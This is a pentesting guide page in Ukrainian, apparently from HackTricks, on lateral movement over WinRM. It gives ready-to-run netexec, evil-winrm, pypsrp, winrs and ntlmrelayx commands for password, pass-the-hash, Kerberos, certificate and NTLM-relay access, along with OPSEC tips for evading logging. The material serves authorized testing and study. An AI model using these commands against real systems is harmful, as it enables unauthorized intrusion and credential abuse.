# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM — це один із найзручніших транспортув для **lateral movement** у Windows-середовищах, бо він дає віддалену shell через **WS-Man/HTTP(S)** без потреби в трюках із створенням SMB service. Якщо ціль відкриває **5985/5986** і ваш principal має дозвіл на remoting, ви часто можете дуже швидко перейти від "valid creds" до "interactive shell".

Для **protocol/service enumeration**, listeners, увімкнення WinRM, `Invoke-Command` і загального використання клієнта дивіться:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Чому operators люблять WinRM

- Використовує **HTTP/HTTPS** замість SMB/RPC, тож часто працює там, де execution у стилі PsExec заблоковано.
- З **Kerberos** він не надсилає до цілі reusable credentials.
- Добре працює з інструментами для **Windows**, **Linux** і **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Шлях PowerShell remoting для інтерактивної сесії запускає на цілі **`wsmprovhost.exe`** під контекстом authenticated user, що operationally відрізняється від service-based exec.

## Модель доступу та prerequisites

На практиці успішне WinRM lateral movement залежить від **трьох** речей:

1. На цілі є **WinRM listener** (`5985`/`5986`) і firewall rules, що дозволяють доступ.
2. Обліковий запис може **authenticate** до endpoint.
3. Обліковий запис має право **open a remoting session**.

Поширені способи отримати такий доступ:

- **Local Administrator** на цілі.
- Membership у **Remote Management Users** на новіших системах або **WinRMRemoteWMIUsers__** на системах/компонентах, які все ще враховують цю групу.
- Явно делеговані remoting rights через local security descriptors / зміни PowerShell remoting ACL.

Якщо ви вже контролюєте box з admin rights, пам’ятайте, що також можна **delegate WinRM access without full admin group membership** за допомогою технік, описаних тут:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas, які мають значення під час lateral movement

- **Kerberos requires a hostname/FQDN**. Якщо підключатися по IP, client зазвичай переходить на **NTLM/Negotiate**.
- У **workgroup** або cross-trust edge cases NTLM зазвичай вимагає або **HTTPS**, або щоб target був доданий до **TrustedHosts** на client.
- З **local accounts** через Negotiate у workgroup UAC remote restrictions можуть блокувати доступ, якщо не використовується вбудований Administrator account або `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting за замовчуванням використовує **`HTTP/<host>` SPN**. У середовищах, де `HTTP/<host>` уже зареєстрований за іншим service account, WinRM Kerberos може завершитися помилкою `0x80090322`; використайте SPN із портом або перейдіть на **`WSMAN/<host>`**, де такий SPN існує.

Якщо під час password spraying ви отримали valid credentials, перевірка їх через WinRM часто є найшвидшим способом з’ясувати, чи дадуть вони shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec для validation і one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM для інтерактивних shell

`evil-winrm` залишається найзручнішим інтерактивним варіантом з Linux, оскільки підтримує **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, передачу файлів і завантаження PowerShell/.NET у пам’ять.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Крайній випадок Kerberos SPN: `HTTP` vs `WSMAN`

Коли стандартний **`HTTP/<host>`** SPN спричиняє збої Kerberos, спробуйте запитати/використати замість нього квиток **`WSMAN/<host>`**. Це трапляється в посилених або дивних корпоративних налаштуваннях, де `HTTP/<host>` уже прив’язаний до іншого service account.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Це також корисно після зловживання **RBCD / S4U**, коли ви спеціально підробили або запросили service ticket **WSMAN** замість загального `HTTP` ticket.

### Certificate-based authentication

WinRM також підтримує **client certificate authentication**, але certificate має бути зіставлений на цілі з **local account**. З offensive perspective це важливо, коли:

- ви вже вкрали/експортували valid client certificate і private key, які вже mapped для WinRM;
- ви зловживали **AD CS / Pass-the-Certificate** щоб отримати certificate для principal, а потім перейти в інший authentication path;
- ви працюєте в середовищах, які навмисно уникають password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM є набагато менш поширеним, ніж password/hash/Kerberos auth, але коли він існує, він може забезпечити шлях **passwordless lateral movement**, який переживає ротацію пароля.

### Python / automation with `pypsrp`

Якщо вам потрібна automation замість operator shell, `pypsrp` надає WinRM/PSRP з Python із підтримкою **NTLM**, **certificate auth**, **Kerberos** і **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Латеральний рух у Windows через WinRM

### `winrs.exe`

`winrs.exe` вбудований і корисний, коли вам потрібне **нативне виконання команд через WinRM** без відкриття інтерактивної сесії PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Операційно, `winrs.exe` зазвичай призводить до ланцюжка віддалених процесів, схожого на:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Це варто запам’ятати, бо це відрізняється від service-based exec і від інтерактивних сесій PSRP.

### `winrm.cmd` / WS-Man COM замість PowerShell remoting

Ви також можете виконувати через **WinRM transport** без `Enter-PSSession`, викликаючи класи WMI через WS-Man. Це зберігає transport як WinRM, тоді як віддалений primitive виконання стає **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Такий підхід корисний, коли:

- PowerShell logging ретельно моніториться.
- Вам потрібен **WinRM transport**, але не класичний PS remoting workflow.
- Ви створюєте або використовуєте custom tooling навколо **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

Коли SMB relay блокується через signing, а LDAP relay має обмеження, **WS-Man/WinRM** все ще може бути привабливою relay ціллю. Сучасний `ntlmrelayx.py` включає **WinRM relay servers** і може relay до **`wsman://`** або **`winrms://`** targets.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Два практичні зауваження:

- Relay найкорисніший, коли ціль приймає **NTLM** і relayed principal має право використовувати WinRM.
- Недавній код Impacket спеціально обробляє запити **`WSMANIDENTIFY: unauthenticated`**, тож перевірки у стилі `Test-WSMan` не ламають flow relay.

Для обмежень multi-hop після отримання першої WinRM session дивіться:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC і зауваження щодо detection

- **Interactive PowerShell remoting** зазвичай створює **`wsmprovhost.exe`** на цілі.
- **`winrs.exe`** зазвичай створює **`winrshost.exe`**, а потім запитаний дочірній process.
- Очікуйте telemetry **network logon**, події WinRM service і PowerShell operational/script-block logging, якщо використовуєте PSRP замість raw `cmd.exe`.
- Якщо вам потрібна лише одна команда, `winrs.exe` або одноразове WinRM execution можуть бути тихішими, ніж довгоживуча interactive remoting session.
- Якщо Kerberos доступний, надавайте перевагу **FQDN + Kerberos** над IP + NTLM, щоб зменшити і проблеми довіри, і незручні зміни `TrustedHosts` на стороні client.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
